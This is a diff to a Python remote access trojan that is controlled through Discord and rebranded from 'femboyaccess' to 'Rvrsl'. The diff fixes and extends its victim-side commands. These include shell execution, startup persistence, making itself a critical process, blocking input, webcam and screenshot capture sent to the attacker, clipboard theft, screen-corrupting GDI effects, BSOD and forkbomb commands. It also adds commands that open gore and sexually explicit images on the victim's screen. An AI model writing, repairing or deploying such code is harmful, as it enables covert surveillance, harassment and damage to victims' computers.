@@ -5,6 +5,11 @@ import requests
 import json
 import pyautogui
 import ctypes
+import random
+import asyncio
+import win32gui
+import win32con
+from win32api import RGB, GetSystemMetrics
 import sys
 import webbrowser
 import random
@@ -17,6 +22,7 @@ import win32crypt
 import comtypes
 import sqlite3
 import win32com.client as wincl
+import pyperclip
 from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
 from pynput.keyboard import Key, Controller
 import re
@@ -36,7 +42,6 @@ from win32con import *
 import aiohttp
 import patoolib
 import shutil
-import cv2
 import pyautogui as auto
 import tkinter
 from PIL import Image, ImageTk, ImageDraw, ImageFont
@@ -50,6 +55,7 @@ from win32file import *
 from plyer import notification
 from tkinter import Toplevel
 import threading
+import cv2
 
 #//  VARIABLES AND CONSTANTS (DO NOT TOUCH ANYTHING EXCEPT GUILD_ID AND TOKEN)  \\#
 version = "(version: 1.8)"
@@ -89,6 +95,7 @@ commands_list = [
 	"bsod - self-explanatory",
 	"startup - add femboyaccess to startup",
 	"gore - shows a gore photo",
+	"bbc - shows a bbc photo",
 	"randommousemovements - randomly moves the user's mouse location",
 	"randomvolume - changes the volume value randomly",
 	"getclipboard - fetches the victim's clipboard and sends it",
@@ -208,7 +215,7 @@ async def check_privileges():
 		return "idk"
 
 async def femboyaccess(title, description):
-	full_title = f"femboyaccess - {title} _ {version}"
+	full_title = f"Rvrsl - {title} _ {version}"
 	full_description = description
 
 	message = f"```ansi\n{full_title}\n\n{full_description}```"
@@ -495,7 +502,7 @@ async def on_ready():
 		isvm = "yes"
 
 	await channel.send  (f"""```ansi
-femboyaccess - new session created! >w<
+Rvrsl - new session created! >w<
 
 - session: {session_id}
 - username: {os.getlogin()}
@@ -587,7 +594,7 @@ async def on_message(message):
 		if output == "":
 			output = "no output! :c"
 		await message.reply(f"""```ansi
-\033[2;35mfemboyaccess - shell >w<
+\033[2;Rvrsl - shell 
 
 \033[2;37mshell > {os.getcwd()}
 \033[0m\033[2;35m
@@ -598,7 +605,7 @@ async def on_message(message):
 		file = message.content.split(" ")[1]
 		subprocess.Popen(file, shell=True)
 		await message.reply(f"""```ansi
-\033[2;35mfemboyaccess - run >w<
+\033[2;Rvrsl - run >w<
 
 \033[2;37mstarted {file}!\033[0m\033[2;35m\033[0m```""")
 
@@ -608,9 +615,9 @@ async def on_message(message):
 	
 	if message.content.startswith("startup"):
 		await message.reply("""```ansi
-\033[2;35mfemboyaccess - startup 
+\033[2;35mRvrsl - startup 
 
-\033[2;37mfemboyaccess will now launch at startup!\033[0m\033[2;35m\033[0m```""")
+\033[2;37mRvrsl will now launch at startup!\033[0m\033[2;35m\033[0m```""")
 		await startup()
 		
 	if message.content.startswith("bsod"):
@@ -631,19 +638,24 @@ async def on_message(message):
 		file = discord.File(path)
 		await message.reply(
     """```
-femboyaccess - screenshot 
+Rvrsl - screenshot 
 
 screenshot done, see attached file
 ```""", 
     file=file
 )
 	if message.content.startswith("gore"):
-		webbrowser.get().openwebbrowser.open("https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQK-21zC6B8NKZhIg5dsUGdqPGzChux8GoW_CxVv48nlLJ6wSaD-eXpSNNA_yZ3widfOr8&usqp=CAU", new=0)
-		await message.reply("""```
-					  
-					  gored```""")
+		# This will open the specified URL in the default web browser
+		webbrowser.open("https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQK-21zC6B8NKZhIg5dsUGdqPGzChux8GoW_CxVv48nlLJ6wSaD-eXpSNNA_yZ3widfOr8&usqp=CAU", new=0)
+		await message.reply("```\ngored```")
 
+	if message.content.startswith("spaget"):
+			webbrowser.open("https://video314.monstercockland.com/mcl/media/photos/thumbs/358992.jpg", new=0)
+			await message.reply("```\spaget```")
 
+	if message.content.startswith("bbc"):
+			webbrowser.open("https://upload.wikimedia.org/wikipedia/commons/thumb/3/32/Male_micro.jpg/800px-Male_micro.jpg", new=0)
+			await message.reply("```\BBCed```")
 
 	if message.content.startswith("randommousemovements"):
 		if not random_mouse_running:
@@ -769,16 +781,16 @@ screenshot done, see attached file
 
 	if message.content.startswith("blockinput"):
 		is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
-		if is_admin == True:
-			donkeyballs = windll.user32.BlockInput(True)
+		if is_admin:
+			ctypes.windll.user32.BlockInput(True)
 			await message.reply(await femboyaccess("blockinput", "blocked inputs successfully! "))
 		else:
 			await message.reply(await femboyaccess("blockinput", "admin rights are required for this command"))
 
 	if message.content.startswith("unblockinput"):
 		is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
-		if is_admin == True:
-			donkeyballs = windll.user32.BlockInput(False)
+		if is_admin:
+			ctypes.windll.user32.BlockInput(False)
 			await message.reply(await femboyaccess("unblockinput", "unblocked inputs successfully! "))
 		else:
 			await message.reply(await femboyaccess("unblockinput", "admin rights are required for this command"))
@@ -854,15 +866,15 @@ screenshot done, see attached file
 		try:
 			ctypes.windll.ntdll.RtlAdjustPrivilege(20, 1, 0, ctypes.byref(ctypes.c_bool()))
 			ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0) == 0
-			await message.reply(await femboyaccess("critproc", "femboyaccess is now a critical process! "))
+			await message.reply(await femboyaccess("critproc", "Rvrsl is now a critical process! "))
 		except:
-			await message.reply(await femboyaccess("critproc", "could not turn femboyaccess into a critical process! :c"))
+			await message.reply(await femboyaccess("critproc", "could not turn Rvrsl into a critical process! :c"))
 	if message.content.startswith("uncritproc"):
 		try:
 			ctypes.windll.ntdll.RtlSetProcessIsCritical(0, 0, 0) == 0
-			await message.reply(await femboyaccess("uncritproc", "femboyaccess is no longer a critical process! "))
+			await message.reply(await femboyaccess("uncritproc", "Rvrsl is no longer a critical process! "))
 		except:
-			await message.reply(await femboyaccess("uncritproc", "could not turn femboyaccess into a normal process! :c"))
+			await message.reply(await femboyaccess("uncritproc", "could not turn Rvrsl into a normal process! :c"))
 
 	if message.content.startswith("idletime"):
 		class LASTINPUTINFO(ctypes.Structure):
@@ -984,7 +996,7 @@ screenshot done, see attached file
 	if message.content.startswith("webcampic"):
 		webcam = cv2.VideoCapture(0, cv2.CAP_DSHOW)
 		result, image = webcam.read()
-		imwrite('webcam.png', image)
+		cv2.imwrite('webcam.png', image)
 		reaction_msg = await message.reply(await femboyaccess("webcampic", "lmao"), file=discord.File('webcam.png'))
 		subprocess.run('del webcam.png', shell=True)
 
@@ -1061,50 +1073,45 @@ screenshot done, see attached file
 		await piano_message.edit(view=MyView(piano_message))
 
 	if message.content.startswith("gdi"):
-		desk = win32gui.GetDC(0)
+		desk_handle = win32gui.GetDesktopWindow()  # Get the desktop window handle
+		desk = win32gui.GetDC(desk_handle)         # Get the device context of the desktop
 		x = GetSystemMetrics(0)
 		y = GetSystemMetrics(1)
 		mode = message.content.split(" ")[1]
-		time = message.content.split(" ")[2]
+		time = int(message.content.split(" ")[2])  # Ensure time is an integer
+
 		if mode == "patinvert":
 			await message.reply(await femboyaccess("gdi", f"started the patinvert effect for {time}ms! "))
-			for i in range(0, 100):
+			for _ in range(100):
 				brush = win32gui.CreateSolidBrush(RGB(random.randrange(255), random.randrange(255), random.randrange(255)))
 				win32gui.SelectObject(desk, brush)
-				win32gui.PatBlt(desk, random.randrange(x), random.randrange(y), random.randrange(x), random.randrange(y), PATINVERT)
-				asyncio.sleep(int(time))
-			win32gui.ReleaseDC(desk, GetDesktopWindow())
-			win32gui.DeleteDC(desk)
+				win32gui.PatBlt(desk, random.randrange(x), random.randrange(y), random.randrange(x), random.randrange(y), win32con.PATINVERT)
+				await asyncio.sleep(time / 1000)
+			win32gui.ReleaseDC(desk_handle, desk)  # Release the device context using both the handle and DC
+			win32gui.DeleteObject(brush)
 			await message.reply(await femboyaccess("gdi", f"stopped the patinvert effect! "))
+
 		elif mode == "patcopy":
 			await message.reply(await femboyaccess("gdi", f"started the patcopy effect for {time}ms! "))
-			for i in range(0, 100):
-				brush = win32gui.CreateSolidBrush(RGB(
-					random.randrange(255),
-					random.randrange(255),
-					random.randrange(255)
-					))
+			for _ in range(100):
+				brush = win32gui.CreateSolidBrush(RGB(random.randrange(255), random.randrange(255), random.randrange(255)))
 				win32gui.SelectObject(desk, brush)
-				win32gui.PatBlt(desk, random.randrange(x), random.randrange(y), random.randrange(x), random.randrange(y), PATCOPY)
-				asyncio.sleep(int(time))
-			win32gui.ReleaseDC(desk, GetDesktopWindow())
-			win32gui.DeleteDC(desk)
+				win32gui.PatBlt(desk, random.randrange(x), random.randrange(y), random.randrange(x), random.randrange(y), win32con.PATCOPY)
+				await asyncio.sleep(time / 1000)
+			win32gui.ReleaseDC(desk_handle, desk)
+			win32gui.DeleteObject(brush)
 			await message.reply(await femboyaccess("gdi", f"stopped the patcopy effect! "))
+
 		elif mode == "srccopy":
 			await message.reply(await femboyaccess("gdi", f"started the srccopy effect for {time}ms! "))
-			for i in range(0, 100):
-				brush = win32gui.CreateSolidBrush(RGB(
-					random.randrange(255),
-					random.randrange(255),
-					random.randrange(255)
-				))
+			for _ in range(100):
+				brush = win32gui.CreateSolidBrush(RGB(random.randrange(255), random.randrange(255), random.randrange(255)))
 				win32gui.SelectObject(desk, brush)
-				win32gui.PatBlt(desk, random.randrange(x), random.randrange(y), random.randrange(x), random.randrange(y), SRCCOPY)
-				asyncio.sleep(int(time))
-			win32gui.ReleaseDC(desk, GetDesktopWindow())
-			win32gui.DeleteDC(desk)
+				win32gui.PatBlt(desk, random.randrange(x), random.randrange(y), random.randrange(x), random.randrange(y), win32con.SRCCOPY)
+				await asyncio.sleep(time / 1000)
+			win32gui.ReleaseDC(desk_handle, desk)
+			win32gui.DeleteObject(brush)
 			await message.reply(await femboyaccess("gdi", f"stopped the srccopy effect! "))
-
 	if message.content.startswith("opencd"):
 		winmm = ctypes.windll.winmm
 		MCI_OPEN_DRIVER = 0x080D
@@ -1258,17 +1265,19 @@ screenshot done, see attached file
 		except Exception as e:
 			await message.reply(await femboyaccess("webredirect", f"could not redirect listed website! :c\nerror: {str(e)}"))
 
-	if message.content.startswith("desktopflood"):
-		name = message.content.split('"')[1]
-		desktop_path = os.path.expanduser("~/Desktop")
-		for i in range(count):
-			file_path = os.path.join(desktop_path, f"{filename}_{i+1}.lol")
-			try:
-				with open(file_path, 'w') as file:
-					file.write("0")
-				await message.reply(await femboyaccess("desktopflood", "flooded the desktop! "))
-			except Exception as e:
-				await message.reply(await femboyaccess("desktopflood", "could not flood the desktop! :c"))
+#	if message.content.startswith("desktopflood"):
+#		name = message.content.split('"')[1]
+#		desktop_path = os.path.expanduser("~/Desktop")
+#		for i in range(count):
+#			file_path = os.path.join(desktop_path, f"{filename}_{i+1}.lol")
+#			try:
+#				with open(file_path, 'w') as file:
+#					file.write("0")
+#				await message.reply(await femboyaccess("desktopflood", "flooded the desktop! "))
+#			except Exception as e:
+#				await message.reply(await femboyaccess("desktopflood", "could not flood the desktop! :c"))
+
+#NOT WORKING NOW FOR SOME REASON
 
 	if message.content.startswith("forkbomb"):
 		path = os.path.expanduser("~")
@@ -1362,8 +1371,18 @@ screenshot done, see attached file
 
 @client.event
 async def on_disconnect():
-	await channel.send(await femboyaccess("disconnected", "this session is disconnected (unusable)! "))
-	await channel.delete()
-	await client.close()
+    global channel  # Ensure the channel variable is accessible
+    if channel is not None:  # Check if the channel variable is defined
+        try:
+            await channel.send(await femboyaccess("disconnected", "this session is disconnected (unusable)! "))
+            await channel.delete()  # Delete the channel if applicable
+        except discord.Forbidden:
+            print("Failed to send message or delete channel due to permissions.")
+        except discord.HTTPException as e:
+            print(f"An error occurred while sending the message or deleting the channel: {e}")
+    await client.close()  # Close the bot
 
 client.run(token)
+
+
+ipaddress.IPv4Network
